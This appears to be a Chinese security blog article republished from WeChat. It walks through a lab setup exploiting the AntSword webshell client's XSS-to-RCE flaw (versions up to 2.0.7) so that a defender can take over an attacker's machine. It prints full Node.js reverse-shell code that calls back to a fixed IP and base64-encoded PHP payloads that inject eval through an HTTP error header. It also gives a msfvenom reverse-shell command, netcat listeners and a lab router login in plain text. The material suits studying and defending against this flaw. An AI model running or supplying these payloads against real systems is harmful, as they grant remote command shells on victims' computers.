> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/thLttnT09Qr53bTKejw5BA)

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMNib9xnvZvqay2LIQVxLqC86xw1Sfr6nzyAkQvHSZ2ibT3joNkpdhMdg/640?wx_fmt=png)

**Zero**

  

**漏洞概述**

中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。  
2019 年 4 月 12 日凌晨，有用户在中国蚁剑 GitHub 上提交了 issue，称发现中国蚁剑存在 XSS 漏洞，借此可引起 RCE。据悉，该漏洞是因为在 webshell 远程连接失败时，中国蚁剑会返回错误信息，但因为使用的是 html 解析，导致 xss 漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMNib9xnvZvqay2LIQVxLqC86xw1Sfr6nzyAkQvHSZ2ibT3joNkpdhMdg/640?wx_fmt=png)

**One**

  

**影响范围**

AntSword <=2.0.7

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMNib9xnvZvqay2LIQVxLqC86xw1Sfr6nzyAkQvHSZ2ibT3joNkpdhMdg/640?wx_fmt=png)

**Two**

  

**实验环境搭建**

### **●****环境拓扑**

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ10Qc7VcQHZoFbXt8iaw6NEkxRgjCaj09xnxFG5QdftypV5QxH5QSUcQ/640?wx_fmt=png)

### **●****安装 v2.0.7 版本蚁剑**

版本 2.0.7 的蚁剑不能安装在 Linux 系统，所以将 Windows 10 物理机当做红队使用的主机。

> 下载地址：链接：https://pan.baidu.com/s/1x8bXH-ph6wRCZcmIt_HHDw  
> 提取码：rizb

1. 将压缩包解压，解压之后。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZkrdk6cG5SVSSQFaOFkMxzmgaVQO01dOrnJ9uN49j1ppDA5VibgSiaPCg/640?wx_fmt=png)

2. 打开启动器, 选择 windows 版本，双击 AntSword.exe 启动文件。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZKpiblOdeOTSia8751GdTOK69Nuls1QEniaoXd1sYVx10VGmuict4CUc3jQ/640?wx_fmt=png)

3. 初始化, 配置核心源代码文件位置。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZzMwFOAZ5MNvmhNQIRylt3oqKYDYe3yPiapaC6tX6neiaaU8knU0ec7SA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ6TLsORtvLADCHF9ZdDU2FQXjG3nhD1uyHibsMOa0ibibWprIiaK4iaEpXPg/640?wx_fmt=png)

4. 双击 AntSword.exe 重启。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZwZADd3GoEiaCPUMVmtfKnEbMBzxb4iaXUz6Cq5kgOjOzfMRwNLGbyLyA/640?wx_fmt=png)

### **●****蓝队靶标 Centos 7**

Centos 7 自动获取到的 IP 地址为 10.10.19.50  
1. 在靶机上搭建 LAMP 服务和 phpcms v9.6.0 环境。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ8JBEtEn6SNibUVkpqpuiabXBerliajFSDK78Q21AnQcr2Bc5eROephdyQ/640?wx_fmt=png)

2. 边界 FW2 防火墙开放对应的接口  
访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZeyzWU38omkBql2Jl2KqSZZ84apadmkVtykDDAAypBlAcs3KqcmicicXg/640?wx_fmt=png)

点击 “网络 -> 防火墙 ->端口转发 ->新增”，则可以添加新的端口转发规则。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ4yCRg0xoGWf5XJSnfXbGHibt0VhS12GWibqPMLluTFaNsUqMSz3KkFnw/640?wx_fmt=png)

设置新的端口转发规则。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZBXU1AafhOgFDlGHj2uf9yXjVicBdVM8MA5iccicE7Zm9rAFBQztA3CsrA/640?wx_fmt=png)

> 名称：可以任意取名，建议与规则相关；  
> 协议：可以选择 TCP、UDP、ICMP，一个规则最好只选一个协议，不然容易出问题；  
> 源区域：这个指的是外网所在的区域，我们事先配置好了每个接口一个区域，因此只要选对应接口即可，FW2 选 ETH4，FW1 选 ETH2；  
> 外部端口：这里是外网供访问的端口号，可以填单个端口或者一个端口段，如 8000-9000；  
> 目标区域：这里填写的是前往内网服务器路由的出接口，以 FW2 为例，如果要映射服务器就填写 ETH3；  
> 内部 IP 地址：这里填写内网服务器的 IP 地址，在下拉框的最后可以输入 ip 按回车即可变为可选的 ip；  
> 内部端口：这里填写内部服务器要映射的端口，可以填单个端口或者一个端口段，如 8000-9000。

配置完成后点击右下角保存，即可增加规则，但规则不会马上生效。规则是自上而下进行匹配的，可以按住规则右侧的白色按钮上下拖动调整顺序，最后点击 “保存并应用” 方可生效。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZiagJ3sCoo5DgplTMNzfP78TEL4b09Yo97iaicm8TooSyy9EYv1G3lMOBg/640?wx_fmt=png)

**●****蓝队靶标 Windows Server 2016**  

Windows Server 2016 自动获取到的 IP 地址是 10.10.19.51  
1. 使用 phpstudy 搭建，启动 nginx+mysql 服务。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZHic2USDibus1vfwndRdp8GbWHPNyOpbj4nHbcfIhqp0FlyNZPtb15fOQ/640?wx_fmt=png)

2. 搭建好 phpcms v9.6.0 环境。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ20c5Lib8vJNKoo5uoYWdrklyOYdfZ4C6HsLKLFMEKtBvFiawcKicxgW9g/640?wx_fmt=png)

3. 边界 FW2 防火墙开放对应的接口  
访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZeyzWU38omkBql2Jl2KqSZZ84apadmkVtykDDAAypBlAcs3KqcmicicXg/640?wx_fmt=png)

点击 “网络 -> 防火墙 ->端口转发 ->新增”，则可以添加新的端口转发规则。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ4yCRg0xoGWf5XJSnfXbGHibt0VhS12GWibqPMLluTFaNsUqMSz3KkFnw/640?wx_fmt=png)

设置新的端口转发规则。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZS4SCvdJpJEsk7PfPz1NGopMPza53wBI6cRHX5Uru4d0unpSvBsI7Kw/640?wx_fmt=png)

> 将靶标 Windows Server 2016 上的 phpcms 平台映射到公网 66.28.5.2 的 80 端口上

配置完成后点击右下角保存，即可增加规则，但规则不会马上生效。规则是自上而下进行匹配的，可以按住规则右侧的白色按钮上下拖动调整顺序，最后点击 “保存并应用” 方可生效。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZOJKd6QffkCKEDKSVOBPYxr7NvVTd5zMUibp0olMC2CLH7h01iaNYDBtA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMNib9xnvZvqay2LIQVxLqC86xw1Sfr6nzyAkQvHSZ2ibT3joNkpdhMdg/640?wx_fmt=png)

**Three**

  

**反制**

### ****●**反制条件**

#### **红队：Windows 10 蓝队: Centos 7**

1. 红队通过 phpcms v9.6.0 文件上传漏洞，上传了一句话木马文件，并且使用蚁剑成功连接。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZpVurzvg255mvdLcssVuerE6RictPhZnyVnutc37ZJwywfuc6AcqzFsA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZfNvGic0cbx68ScLNr70ZSszHJe7tEmv7eHeicEvXe4p9Mp78s75PibuMA/640?wx_fmt=png)

2. 蓝队 Centos 7 ：关闭防火墙。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ2jDibE6s2iatgLvgeMokBiavxpGyiag15nvanyIKLloKecdVaotrwZo2LA/640?wx_fmt=png)

3. 边界 FW2 防火墙开放接口  
访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZeyzWU38omkBql2Jl2KqSZZ84apadmkVtykDDAAypBlAcs3KqcmicicXg/640?wx_fmt=png)

点击 “网络 -> 防火墙 ->端口转发”，则可以看到端口转发规则。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZUic7TiamdccYAI36fKjiaxt8S8wqP00ribBJaeicrXI4Iib8v6j0feLhjk3Q/640?wx_fmt=png)

点击 “编辑”，进入修改端口转发规则。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZUUcpWgvydd0HID1AoCUyd3k8Qp2rQVpguW2OwrkytyZFNrCKst5Wkw/640?wx_fmt=png)

配置完成后点击右下角保存，即可修改规则，最后点击 “保存并应用” 方可生效。

#### **红队：Windows 10 蓝队：Windows Server 2016**

1. 红队通过 phpcms v9.6.0 文件上传漏洞，上传了一句话木马文件，并且使用蚁剑成功连接。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZwp4HrKeprNB0uIFXQ56CrXLAdUUObqh2gNibHt1T7ibjSSha2UIzr6rw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZkeI3j9JjfmGuKJkr8B1R1ByjicSM6q18X0ZTwRldrVJcU0MBDttkicRw/640?wx_fmt=png)

2. 蓝队 Windows Server 2016：关闭防火墙。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZl6sliaoUu7aakPNTRK9hRX8USdtjGSDRPrkJyEq8vQiamZw6G0XB0OtA/640?wx_fmt=png)

3. 边界 FW2 防火墙开放接口  
访问 http://1.1.1.12/cgi-bin/luci/，输入 root/goktech 进行登录。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZeyzWU38omkBql2Jl2KqSZZ84apadmkVtykDDAAypBlAcs3KqcmicicXg/640?wx_fmt=png)

点击 “网络 -> 防火墙 ->端口转发”，则可以看到端口转发规则。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMwC5ReltydHR6oWQWcdBAZNQsVbhHSyw9rsXfNoHfcK9agG2sNiciaPw/640?wx_fmt=png)

点击 “编辑”，进入修改端口转发规则。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ6t1C7fUkeqhCBjQCduFs1KKsUYqKHoH6eFb3O7ZLuIm8ekFMP2m1jA/640?wx_fmt=png)

配置完成后点击右下角保存，即可修改规则，最后点击 “保存并应用” 方可生效。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZXCtiaS6hekOU5TVkKAhhuoAf2E9XL1qej46eScibchFQSmz7JqRokhOQ/640?wx_fmt=png)

4. 红队 Windows 10 关闭杀毒软件，比如火绒、360 等等。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZPxFyb4PXzZjsvLaNVKJqfqhq2NDh96BwpUnWzRKldbllh6iamPAic1Bw/640?wx_fmt=png)

> 如果没有关闭火绒，则会报僵尸网络攻击，并将攻击进行拦截。

### ****●******反制目的**

当红队再次使用蚁剑连接时，直接反弹 shell，蓝队可以反控红队机器。

### ****●******反制开始条件**

#### **红队：Windows 10 蓝队: Centos 7**

1. 蓝队检查日志时，发现红队使用蚁剑 v2.0 连接了 20220609050516861.php。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZhwZmAV0tUBzBUn3SlBYsdLdvMIwDBOic1e0Sl4NFNMmzh5SjSe545BQ/640?wx_fmt=png)

2. 查看 20220609050516861.php，发现该文件是一句话木马文件。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMRFPFUq00JVM92yTGicrfZCsfpe59H7eTjKSEZLH8Mx5V7rfibib2PpdA/640?wx_fmt=png)

### ****●******反制过程**

#### **Centos 7**

1. 蓝队就准备根据蚁剑 v2.0 漏洞进行反制红队，制作 payload，修改 20220609050516861.php 内容。  
1.1 使用 net.Socket 方法制作木马  
将以下内容进行 base64 编码, 66.28.5.2 为蓝队 centos 7 映射到公网上的 IP 地址，监听端口为 10099。

```
var net = require("net"), sh = require("child_process").exec("cmd.exe");var client = new net.Socket();client.connect(10099, "66.28.5.2", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```

> 在 Node.js 中提供了一个 net.Socket 对象，用于方便调用底层 Socket 接口，实现数据传输的功能。net.Socket 既可以读也可以写，这个 client 建立 socket 链接，实现了将对方 cmd.exe 的标准输入输出与标准错误流转发到受害者自己的 ip:10099 端口上。

将上面 base64 编码完成的内容放进 Buffer 函数中。

```
<?phpheader("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCgxMDA5OSwgIjY2LjI4LjUuMiIsIGZ1bmN0aW9uKCl7Y2xpZW50LnBpcGUoc2guc3RkaW4pO3NoLnN0ZG91dC5waXBlKGNsaWVudCk7c2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=`,`base64`).toString())'>");?>
```

1.2 使用 MSF 生成 node.js 木马  
使用 msfvenom 命令生成木马

> msfvenom -p nodejs/shell_reverse_tcp LHOST=66.28.5.2 LPORT=10099 -f raw -o payload.js

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZxwSiahES2qERKPY0ez3zqqicziaTNUyMkGbOYxjJDzBmPqyNFv1icQ2JfA/640?wx_fmt=png)

将 payload.js 中的内容进行 base64 编码，将 base64 编码完成的代码放进 Buffer 函数。  

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZzmrOkfHibngq9fCibnn0UWh9ibDR9eAXb92Kq0BqVeKCYeibRu3eL6TvHA/640?wx_fmt=png)

```
<?phpheader("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`KGZ1bmN0aW9uKCl7IHZhciByZXF1aXJlID0gZ2xvYmFsLnJlcXVpcmUgfHwgZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDsgaWYgKCFyZXF1aXJlKSByZXR1cm47IHZhciBjbWQgPSAoZ2xvYmFsLnByb2Nlc3MucGxhdGZvcm0ubWF0Y2goL153aW4vaSkpID8gImNtZCIgOiAiL2Jpbi9zaCI7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHV0aWwgPSByZXF1aXJlKCJ1dGlsIiksIHNoID0gY3Auc3Bhd24oY21kLCBbXSk7IHZhciBjbGllbnQgPSB0aGlzOyB2YXIgY291bnRlcj0wOyBmdW5jdGlvbiBTdGFnZXJSZXBlYXQoKXsgY2xpZW50LnNvY2tldCA9IG5ldC5jb25uZWN0KDEwMDk5LCAiNjYuMjguNS4yIiwgZnVuY3Rpb24oKSB7IGNsaWVudC5zb2NrZXQucGlwZShzaC5zdGRpbik7IGlmICh0eXBlb2YgdXRpbC5wdW1wID09PSAidW5kZWZpbmVkIikgeyBzaC5zdGRvdXQucGlwZShjbGllbnQuc29ja2V0KTsgc2guc3RkZXJyLnBpcGUoY2xpZW50LnNvY2tldCk7IH0gZWxzZSB7IHV0aWwucHVtcChzaC5zdGRvdXQsIGNsaWVudC5zb2NrZXQpOyB1dGlsLnB1bXAoc2guc3RkZXJyLCBjbGllbnQuc29ja2V0KTsgfSB9KTsgc29ja2V0Lm9uKCJlcnJvciIsIGZ1bmN0aW9uKGVycm9yKSB7IGNvdW50ZXIrKzsgaWYoY291bnRlcjw9IDEwKXsgc2V0VGltZW91dChmdW5jdGlvbigpIHsgU3RhZ2VyUmVwZWF0KCk7fSwgNSoxMDAwKTsgfSBlbHNlIHByb2Nlc3MuZXhpdCgpOyB9KTsgfSBTdGFnZXJSZXBlYXQoKTsgfSkoKTs=`,`base64`).toString())'>");?>
```

2. 开启监听端口  
蓝队使用 nc 开启监听 10099 端口。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZjiciaI5RGd5u91jJ7l01icxVdRQNYre9bdKLZuVP0vvEov2qtibQLML9CA/640?wx_fmt=png)

3. 当红队再一次使用蚁剑进行连接 webshell 时，发现报错，可能以为自己的密码错了或者木马文件没了，而此时，红队已经被蓝队控制了。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZTzap7E9HCyEVeXmve2T0cGJxCdiapMwK4iaJ5JTV0iaNMJRXLxMdEjQCg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZibDql2MQDL67LS2B7zqTGanwibBX11Py8NTdV2XgHSp6K6vxSETuFa1A/640?wx_fmt=png)

### ****●******Windows Server 2016**

1. 蓝队就准备根据蚁剑 v2.0 漏洞进行反制红队，制作 payload，修改 20220609035913593.php 内容。  
将以下内容进行 base64 编码, 66.28.5.2 为蓝队靶机映射到公网上的 IP 地址，监听端口为 10088。

```
var net = require("net"), sh = require("child_process").exec("cmd.exe");var client = new net.Socket();client.connect(10088, "66.28.5.2", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```

> 在 Node.js 中提供了一个 net.Socket 对象，用于方便调用底层 Socket 接口，实现数据传输的功能。net.Socket 既可以读也可以写，这个 client 建立 socket 链接，实现了将对方 cmd.exe 的标准输入输出与标准错误流转发到受害者自己的 ip:10088 端口上。

将上面 base64 编码完成的内容放进 Buffer 函数中。

```
<?phpheader("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCgxMDA4OCwgIjY2LjI4LjUuMiIsIGZ1bmN0aW9uKCl7Y2xpZW50LnBpcGUoc2guc3RkaW4pO3NoLnN0ZG91dC5waXBlKGNsaWVudCk7c2guc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=`,`base64`).toString())'>");?>
```

2. 开启监听端口  
蓝队靶机使用 nc 开启监听 10088 端口。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZudplmLOMGrqGcibA21puIVbqYKwMbyVSoYxC1jl4QSczOEj5AuWEcGg/640?wx_fmt=png)

3. 当红队再一次使用蚁剑进行连接 webshell 时，发现报错，可能以为自己的密码错了或者木马文件没了，而此时，红队已经被蓝队控制了。

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZ0Wqia1JA9FicqpVwjoxBPibZ7724FflmkOZDHDWFK4TMQh0m6wk6t5xow/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZdJy7keZbaAjD3OG2Db13hzL5LGzjw8JNTnbBibS5llLCez6LpbPhPoA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/oAglibP2OiaHgtic9rqa5yxQiaYZv6eOOdAZMNib9xnvZvqay2LIQVxLqC86xw1Sfr6nzyAkQvHSZ2ibT3joNkpdhMdg/640?wx_fmt=png)

**Four**

  

**参考材料**

1.https://mp.weixin.qq.com/s/IRVfXxmPJo2ynym2kl9X-Q  
2.https://github.com/AntSwordProject/antSword/issues/147  
3.https://mp.weixin.qq.com/s/nfa2DHkDPE43cIvvRmk1TA  
4.https://mp.weixin.qq.com/s/MfWuBm_H7JxAvBKfnTpLZQ

文章来源：国科漏斗社区

```
【往期推荐】

【内网渗透】内网信息收集命令汇总


【内网渗透】域内信息收集命令汇总

【超详细 | Python】CS免杀-Shellcode Loader原理(python)

【超详细 | Python】CS免杀-分离+混淆免杀思路


【超详细 | 钟馗之眼】ZoomEye-python命令行的使用


【超详细 | 附EXP】Weblogic CVE-2021-2394 RCE漏洞复现

【超详细】CVE-2020-14882 | Weblogic未授权命令执行漏洞复现

【超详细 | 附PoC】CVE-2021-2109 | Weblogic Server远程代码执行漏洞复现

【漏洞分析 | 附EXP】CVE-2021-21985 VMware vCenter Server 远程代码执行漏洞

【CNVD-2021-30167 | 附PoC】用友NC BeanShell远程代码执行漏洞复现


【奇淫巧技】如何成为一个合格的“FOFA”工程师

【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】

【超详细】Fastjson1.2.24反序列化漏洞复现

  记一次HW实战笔记 | 艰难的提权爬坑

【漏洞速递+检测脚本 | CVE-2021-49104】泛微E-Office任意文件上传漏洞


免杀基础教学（上卷）


免杀基础教学（下卷）


走过路过的大佬们留个关注再走呗

往期文章有彩蛋哦




一如既往的学习，一如既往的整理，一如即往的分享


“如侵权请私聊公众号删文”

渗透Xiao白帽
积硅步以致千里，积怠惰以致深渊！
33篇原创内容
公众号

推荐阅读↓↓↓


EchoSec
萌新专注于网络安全行业学习
10篇原创内容
公众号

我知道你在看哟

```